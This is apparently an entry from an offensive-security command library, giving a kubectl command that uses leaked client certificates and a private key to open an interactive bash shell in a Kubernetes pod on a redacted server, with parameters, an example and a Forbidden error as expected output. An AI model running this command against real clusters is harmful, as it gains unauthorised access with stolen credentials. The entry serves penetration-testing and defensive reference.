---
data: >-
  kubectl --client-certificate client.crt --client-key client.pem
  --certificate-authority ca.crt --server https://█████████ exec -it shell-demo
  -- /bin/bash
tags:
  - kubernetes
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 6dc953fd-03f9-4beb-aad7-8720c5794db7
created_at: '2025-12-11T06:10:23.234Z'
updated_at: '2025-12-11T06:10:23.234Z'
verified: false
validated: true
submitted: true
---
# kubectl-exec-pod

## Command

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash
```

## Description

Attempts to execute bash in a pod using leaked credentials, often fails due to permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--client-certificate` | Client certificate file | Yes |
| `--client-key` | Client private key file | Yes |
| `--certificate-authority` | CA certificate file | Yes |
| `--server` | Kubernetes server URL | Yes |
| `exec -it` | Interactive exec | Yes |
| `-- /bin/bash` | Command to run | Yes |

## Examples

### Basic Usage

```bash
kubectl --client-certificate cert.crt --client-key key.pem --certificate-authority ca.crt --server https://k8s-server exec -it my-pod -- /bin/bash
```

## Expected Output

Error from server (Forbidden): User cannot create pods/exec

## Related

- [[commands/kubectl-exec-pod-with-token]]
- [[procedures/Interact-with-Kubernetes-Cluster-Using-Leaked-Credentials]]
